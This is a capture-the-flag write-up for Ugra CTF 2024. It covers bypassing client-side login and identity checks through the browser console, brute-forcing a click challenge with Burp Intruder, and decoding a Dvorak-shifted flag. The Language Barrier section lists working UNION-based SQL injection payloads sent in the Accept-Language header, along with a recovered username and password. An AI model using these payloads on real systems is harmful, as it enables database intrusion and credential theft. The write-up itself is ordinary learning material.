# Ugra CTF

Tags: international
Status: Not started

# Web

## Wicket Gate

### Description

`url: [https://wicketgate.q.2024.ugractf.ru/pf6cubh8bv090t5y](https://wicketgate.q.2024.ugractf.ru/pf6cubh8bv090t5y)`

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled.png)

### Solution

We’re given a website service, The website is presented in Russian, causing some functions to not be fully understood by me. However, my main focus was on the login application that caught my attention. Through the analysis of request flow using Burp, I found the /list-user endpoint containing information about registered users while attempting to login.

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%201.png)

Approaching the login script in page source of login page, 

```jsx
<script>
        document.getElementById("loginForm").addEventListener("submit", async function(event) {
            event.preventDefault();
            if (await validateCredentials()){
                  this.submit();
            }
            else{
              alert("Недействительный номер читательского билета (возможно, вы не подписали Согласие на обработку персональных данных, обратитесь в библиотеку по адресу, указанному на Главной странице");
            }
        });

        async function validateCredentials() {
            var chitateli = await fetch('/pf6cubh8bv090t5y/list_users').then(response => {
                return response.json();
              }).catch(err => {
                console.log(err);
              })
            var bilet = document.getElementById('bilet').value;
            var reader_password = document.getElementById('password').value;
            if (bilet in chitateli){
              if (chitateli[bilet].isValid == true && chitateli[bilet].signedOnlineConsent == true){
                let password = "";
                password += bilet[5] + bilet[4] + bilet[6];
                password += String.fromCharCode(1040+parseInt(bilet[3]));
                password += String.fromCharCode(1040+parseInt(bilet[7]));
                password += String.fromCharCode(1040+parseInt(bilet[8]));
                password += String(10 - parseInt(bilet[0]));
                password += '7'
                if (password.match(/[0-9]{3}[А-Я]{3}[0-9]{2}/) && password == reader_password){
                  return true;
                }
              }
            }
            return false;
        }
    </script>
```

I examined the page source results and found that valid passwords could be identified through user IDs with two true values. Understanding this, I was able to create a valid password through the browser console.

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%202.png)

After successfully logging in as a valid user, I discovered something interesting on the catalog page, 

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%203.png)

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%204.png)

especially after translating the page. There is a strong indication that this last catalog page is highly relevant to the next steps. I found a second verification feature, and through studying the script in the page source, I realized that I only needed to set the readercheck function to true. 

```jsx
<script>
            document.getElementById("orderForm").addEventListener("submit", function(event) {
                event.preventDefault();
                if (ReaderCheck()){
                      this.submit();
                }
                else{
                  alert("Не подтверждена личность читателя!");
                }
            });                     
    
            function ReaderCheck() {
                var vuz_id = document.getElementById('vuz_id').value;
                if (!vuz_id.match(/^[0-9]{13}$/)){
                    return false;
                }   
                var driver_id = document.getElementById('driver_id').value;
                if (!driver_id.match(/^[0-9]{2}\s[0-9]{2}\s[0-9]{6}$/)){
                    return false;
                }
            }
        </script>
```

we can exactly bypass this with console browser:

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%205.png)

After doing this, I attempted verification as usual and successfully obtained the sought-after flag.

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%206.png)

### Flag

`ugra_wicket_gate_is_not_wicked_y4kcxrh40wv4`

## Language Barrier

### Description

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%207.png)

### Solution

A Russian website service  with a login function and an option to change the language on the main page. Interestingly, when I made the language change, the website sent a `/localization` request that seemed to translate the page not through a third party, but through translation data stored on the server. This led to speculation regarding the potential for Local File Inclusion (LFI), where the translation file may reside on the server or another server, or Remote File Inclusion (RFI), with the possibility of the translation data being stored in the database and could lead to SQL injection (SQLi).

As it turns out, my speculation was correct regarding SQL injection, when I checked the local request when switching languages. The change occurred in the "accept language" header, and if it was empty, it caused an error. My guess was proven correct when I successfully executed the SQLi payload.

![Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%208.png](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%208.png)

![Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%209.png](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%209.png)

Next, I created a simple script to extract data from the database. Although I tried SQLMap and blind SQL techniques, nothing worked, it always stopped halfway. 

Finally, I found that the union method for concatenating strings could be used successfully.

this is the basic enumeration: 

`Accept-Language: asd' UNION SELECT 'a','a' --`

Understanding more about union sql injection
[https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635](https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635)

- database name

`Accept-Language: asd' UNION SELECT 'a',datname from pg_database limit 1 offset 0 --"`

- table name

`Accept-Language: asd' UNION SELECT 'a',column_name from information_schema.columns where table_name='Users' limit 1 offset 1  --`

- column

`Accept-Language: asd' UNION SELECT 'a',table_name AS table_name_1 from information_schema.tables where table_catalog = 'MyPastaDB' and table_schema = 'public' limit 1 offset 1  --`

- Username

`Accept-Language: asd' UNION SELECT 'a',"Username" from "Users" --`

- Password

`Accept-Language: asd' UNION SELECT 'a',"Username" from "Password" --`

So the creds is  pastalover:ZThmZWU3ZTctOTk5OS00NTRlLTk3NWQt

### Flag

`ugra_localization_with_no_sanitazation_05c1962871f0`

# PPC

## Easy

### Description

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2010.png)

### Solution

Given a website we should click thousand times to get flag the only problem is we need to bypass the math problems

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2011.png)

When trying to solving the math  sometimes the result 0 is the correct one

![Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2012.png](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2012.png)

from here we can continuously send a value of 0 to get a possible question that could be an answer of 0 using intruder set to null payload and indefinitely to send continuous requests.

![Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2013.png](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2013.png)

wait until we manage to click to 0 we also send threading by starting the attack many times so that the process is faster where I run 6 attack processes.

### Flag

**`ugra_sorry_for_clickbait_ok5rxau238mm`**

# Misc

## Goole Dyslexia

### Description

![Untitled](Ugra%20CTF%208b5bab512ba24ddf86a2bde93e1e89bb/Untitled%2014.png)

### Solution

[https://awsm-tools.com/keyboard-layout?form[from]=dvorak&form[text]=gipa{c{aemcy{ydco{co{jgpo.e{boc6nkk48aku&form[to]=qwerty](https://awsm-tools.com/keyboard-layout?form%5Bfrom%5D=dvorak&form%5Btext%5D=gipa%7Bc%7Baemcy%7Bydco%7Bco%7Bjgpo.e%7Bboc6nkk48aku&form%5Bto%5D=qwerty)

## Uzh

### Description

### Solution

### Flag